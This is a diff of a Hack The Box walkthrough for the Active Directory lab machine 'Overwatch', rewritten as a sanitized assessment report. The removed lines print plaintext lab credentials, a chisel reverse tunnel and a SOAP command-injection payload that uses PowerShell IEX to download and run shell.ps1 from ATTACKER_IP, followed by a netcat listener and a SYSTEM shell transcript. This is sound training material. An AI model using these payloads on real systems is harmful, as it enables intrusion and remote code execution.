@@ -1,192 +1,100 @@
-<div align="center">
+# Overwatch — Security Assessment
 
-# 🎯 HTB: Overwatch
+| Field | Value |
+| --- | --- |
+| Platform | Hack The Box |
+| Operating system | Windows / Active Directory |
+| Difficulty | Medium |
+| Assessment date | 2026-01-26 (from existing notes; timezone not recorded) |
+| Author | Dylan Senez / d4rkgunn3r |
+| Review status | Proposed revision; publication eligibility and evidence review pending |
 
-![OS](https://img.shields.io/badge/OS-Windows%20AD-0078D6?style=flat-square&logo=windows&logoColor=white)
-![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)
-![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
+## 1. Executive summary
 
-`hackthebox` `active-directory` `guest-access` `rid-cycling` `sql-linked-server` `wcf-command-injection`
+The notes report guest-readable software exposing SQL credentials, further credential exposure in linked-server configuration, WinRM access, and an internal monitoring-service injection resulting in SYSTEM.
 
-</div>
+## 2. Scope and authorization
 
----
+This account concerns the assigned HTB laboratory target only. Target addresses, VPN information, secrets, and flag contents are excluded. This revision analyzes recorded work; no assessment commands were executed during the editorial review. Machine retirement status has not been freshly verified.
 
-> **TL;DR** — The guest account can read a share the anonymous session can't, and that share holds a compiled monitoring app with a hardcoded SQL password in plaintext. SQL Server's linked-server config leaks a second, domain-level credential. That gets WinRM access, which finds an internal-only WCF service with a textbook command-injection bug — RCE as `NT AUTHORITY\SYSTEM` on the Domain Controller.
+## 3. Methodology and reproducibility
 
-## 📋 Box Info
+Discovery → service analysis → recorded access path → privilege/impact assessment → evidence review → remediation. Commands below support authorized discovery and identity verification. Exploitation is described at the finding level; operational payloads and secret-extraction procedures are omitted.
 
-| | |
-|---|---|
-| 🖥️ **OS** | Windows Server 2022 — Domain Controller |
-| 🎯 **Target** | `<TARGET_IP>` (overwatch.htb / S200401.overwatch.htb) |
-| 🎚️ **Difficulty** | Medium |
-| 📅 **Date** | January 26, 2026 |
-| 🏁 **Outcome** | ✅ Full domain compromise |
-
-## 🔍 Recon
+Set the address of the currently assigned lab instance before discovery:
 
 ```bash
-nmap -sV -sC -p- <TARGET_IP> -T4 --min-rate 5000
+export TARGET_IP='REPLACE_WITH_ASSIGNED_LAB_IP'
+mkdir -p evidence/overwatch/{scans,screenshots}
+nmap -sV -p 53,88,135,139,389,445,3389,5985 -oA evidence/overwatch/scans/services "$TARGET_IP"
 ```
 
-21 open ports, all the standard AD Domain Controller fare — DNS, Kerberos, LDAP, SMB, RDP, RPC, ADWS. SMB signing is enforced (rules out easy relay attacks), and an RDP cert confirms the hostname `S200401.overwatch.htb`.
+This is a proposed targeted confirmation command, not the original full-port scan. Nmap creates traffic and local output files. Record tool versions, instance date, and timezone; compare results with the observations below rather than assuming the same services are still present.
 
----
+## 4. Reconnaissance and service analysis
 
-## 🚩 Foothold Chain — Guest Access → Hardcoded Credentials → Linked-Server Leak
+AD services with enforced SMB signing are reported; the hostname is S200401.overwatch.htb. Guest access differed from blocked anonymous access.
 
-### Guest gets more than anonymous
+> **EV-001 — Evidence placeholder:** add the reviewed service-scan excerpt and screenshot here. Remove sensitive identifiers. No screenshot file is claimed to exist at this placeholder.
 
-```bash
-netexec smb <TARGET_IP> -u '' -p '' --shares
-# STATUS_ACCESS_DENIED — anonymous session blocked from share enumeration
+## 5. Recorded initial-access path
 
-netexec smb <TARGET_IP> -u 'guest' -p '' --shares
-```
+A guest-readable binary reportedly contained a SQL connection credential. Linked-server configuration exposed another credential subsequently used for WinRM. The precise disclosure mechanism and permissions are not captured in the reviewed narrative.
 
-```
-IPC$            READ    Remote IPC
-software$       READ
-```
+> **EV-002 — Evidence placeholder:** add a sanitized artifact establishing the behavior and resulting identity. An HTTP success response or tool success message alone does not prove code execution.
 
-> ⚠️ **Root cause:** the built-in guest account is enabled and authenticates with no password. It's not the same as a true null session — and here, it's enough to reach a non-standard share (`software$`) that anonymous access alone couldn't touch.
+## 6. Privilege escalation and impact validation
 
-### RID cycling — the domain, handed over for free
+An internal WCF monitoring operation incorporated caller-controlled input into a privileged shell command. The recorded callback reports nt authority\system. SYSTEM on one domain controller is significant; domain-wide persistence or access to every domain asset was not demonstrated.
 
-Any username at all, paired with an empty password, authenticates as guest — which is enough to walk the domain's RID space:
-
-```bash
-netexec smb <TARGET_IP> -u 'anyuser' -p '' --rid-brute
-```
-
-114 objects enumerated: 100 domain users, 6 computer accounts (DC, SQL server, file server, workstations), and two service accounts worth noting — `sqlsvc` and `sqlmgmt`.
-
-### The `software$` share holds a live credential
-
-Inside `software$` sits a compiled .NET monitoring service. Decompiling it (DnsSpy) turns up a hardcoded SQL connection string:
-
-```csharp
-new SqlConnection("Server=localhost;Database=SecurityLog;User Id=sqlsvc;Password=Tt0IcsfRzuWvJw")
-```
-
-> 💡 A guest-readable share holding a compiled binary is still a credential leak — decompilation is nearly free, and developers routinely forget that "not source code" doesn't mean "not readable."
-
-### SQL Server's linked-server config leaks the next hop
-
-```bash
-impacket-mssqlclient sqlsvc:Tt0IcsfRzuWvJw@<TARGET_IP> -windows-auth
-```
-
-Enumerating linked servers surfaces a second SQL host (`WINSRV02`) whose stored authentication reveals **domain** credentials for `sqlmgmt`: `REGGIE1234ronnie`.
-
-```bash
-evil-winrm -i <TARGET_IP> -u sqlmgmt -p 'REGGIE1234ronnie'
-```
-
-Authenticated WinRM access as a real domain user — no more guest tricks needed.
-
----
-
-## 👑 Root — WCF Command Injection via Tunneled Localhost Service
-
-### Finding the internal-only service
+In an already authorized session, record identity without reading objective contents:
 
 ```powershell
-netstat -ano | findstr LISTENING
+whoami
+hostname
+whoami /priv
 ```
 
-Port `8000` is bound to `127.0.0.1` only — invisible from outside, but reachable now that there's a session on the box.
+These are proposed identity-verification commands, not a claim of rerunning the assessment. Windows privilege enumeration does not prove successful elevation; Linux sudo policy alone does not prove a root session.
 
-### Tunneling in
+> **EV-003 — Evidence placeholder:** add policy/permission evidence and the resulting identity or access proof. Never include flags, tokens, private keys, hashes of credentials, or password values.
 
-```bash
-# attacker
-./chisel server --reverse -p 9000
+## 7. Evidence register and limitations
 
-# target, via WinRM
-.\chisel.exe client <ATTACKER_IP>:9000 R:8000:localhost:8000
-```
+| ID | Required artifact | Current status |
+| --- | --- | --- |
+| EV-001 | Service inventory and timestamped scan excerpt | Text observations available; original artifact review pending |
+| EV-002 | Initial-access behavior and identity proof | Existing narrative reviewed; sanitized artifact pending |
+| EV-003 | Privilege boundary and impact proof | Reported in narrative; original artifact review pending |
 
-```bash
-curl -H "Host: S200401.overwatch.htb" http://127.0.0.1:8000/MonitorService?wsdl
-```
+SYSTEM on the reported DC; domain-wide impact is potential rather than independently demonstrated. Prior source review flags conflicting Linux metadata.
 
-The WSDL reveals a WCF SOAP operation: `KillProcess(string processName)`.
+The source is [the existing repository note](https://github.com/Dylans7j/HackTheBox-Walkthroughs/blob/main/overwatch.md), reviewed at blob SHA `599b4636e4e2467469c844a3977df6dcf4bab5f7`, plus [the repository source review](./EVIDENCE-REVIEW.md). 
 
-### The injection
+A Rooted status is not a substitute for a terminal transcript. Reported results are attributed to the existing notes; they have not been independently reproduced in this review. CVE numbers, fixed-version claims, unsupported timing claims, and numerical severity scores are withheld where primary-source verification is missing.
 
-The backend builds `cmd.exe /c taskkill /F /IM <processName>` with **no sanitization** — a classic OS command injection (CWE-78), just wrapped in SOAP/XML instead of a URL parameter.
+## 8. Findings and remediation
 
-```python
-payload = "notepad; IEX(New-Object -TypeName Net.WebClient).DownloadString('http://<ATTACKER_IP>/shell.ps1');#"
-soap_body = f'''<?xml version="1.0"?>
-<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
-  <soap:Body>
-    <KillProcess xmlns="http://tempuri.org/">
-      <processName>{payload}</processName>
-    </KillProcess>
-  </soap:Body>
-</soap:Envelope>'''
-requests.post('http://127.0.0.1:8000/MonitorService', data=soap_body,
-  headers={'Host': 'S200401.overwatch.htb', 'SOAPAction': 'http://tempuri.org/IMonitorService/KillProcess'})
-```
+| ID | Finding / review target | Remediation |
+| --- | --- | --- |
+| F-001 | Guest share exposure | Disable unnecessary guest access and restrict share/NTFS permissions. |
+| F-002 | Embedded and linked-service credentials | Rotate secrets; use managed identities where suitable; restrict configuration access. |
+| F-003 | Privileged monitoring command injection | Use structured process-management APIs; enforce authentication, authorization, and strict permitted operations. |
 
-```bash
-nc -nvlp 4444
-```
+Prioritize the boundary failures that enable access or elevation. Set final severity after confirming prerequisites, affected privileges, and original evidence.
 
-```
-connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>]
-PS C:\Windows\system32> whoami
-nt authority\system
-```
+## 9. Detection opportunities
 
-```powershell
-PS> type C:\Users\Administrator\Desktop\root.txt
-<ROOT_FLAG_REDACTED>
-```
+Guest SMB reads; SQL linked-server changes/access; WinRM logons; monitoring-service child processes. Tune for approved monitoring and administration.
 
----
+Collect relevant application, authentication, process, and file-change logs. Correlate events by account, host, and time; a single suspicious request is not proof of successful compromise. These are detection proposals, not tested rules or observed telemetry.
 
-## 🔗 Full Attack Chain
+## 10. Remediation validation
 
-```
-Guest SMB access
-   → software$ share (guest-readable)
-   → hardcoded sqlsvc SQL credential (decompiled binary)
-   → SQL linked server leaks sqlmgmt domain credential
-   → WinRM as sqlmgmt
-   → localhost:8000 WCF service discovered
-   → Chisel tunnel exposes it externally
-   → SOAP command injection
-   → NT AUTHORITY\SYSTEM
-```
+Verify corrected permissions and authentication/authorization policy using approved test accounts and administrative configuration review. Confirm exposed secrets were rotated and removed from distributed artifacts. Validate that legitimate workflows still function and monitoring captures permitted test activity. Preserve before/after evidence without exposing sensitive values.
 
-## 📦 Evidence Index
+## 11. Lessons learned and remaining work
 
-| ID | Description |
-|---|---|
-| `EV-001` | Full nmap scan |
-| `EV-002` | Guest SMB share enumeration |
-| `EV-003` | RID-cycling output (114 AD objects) |
-| `EV-004` | Decompiled binary showing hardcoded SQL credential |
-| `EV-007` | WCF command injection exploit + SYSTEM shell transcript |
+Use observed identities and access results to establish impact. Keep service exposure separate from validated weaknesses and distinguish suggested methods from executed steps. Before publication, resolve the gaps in Sections 5–7, verify platform permission, and review every image and output for secrets.
 
-## 🛠️ Remediation
-
-| Finding | Fix |
-|---|---|
-| Guest account enabled with share access | Disable the guest account domain-wide; audit every share for guest/Everyone permissions. |
-| Hardcoded SQL credential in a guest-readable binary | Rotate immediately; never ship credentials in compiled binaries — use gMSAs or a secrets manager. |
-| SQL Server linked server exposing plaintext auth | Remove or re-secure linked server configs; audit for credential exposure via `sp_helplinkedsrvlogin`. |
-| Unauthenticated, unsanitized WCF command execution | Sanitize/whitelist all input reaching a shell command; require auth on every internal endpoint regardless of network binding. |
-| RID cycling exposing the full domain via guest | Restrict anonymous/guest RPC SAM enumeration via GPO (`Network access: Restrict clients allowed to make remote calls to SAM`). |
-
----
-
-<div align="center">
-
-*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*
-
-</div>
+[Back to walkthrough inventory](./README.md)
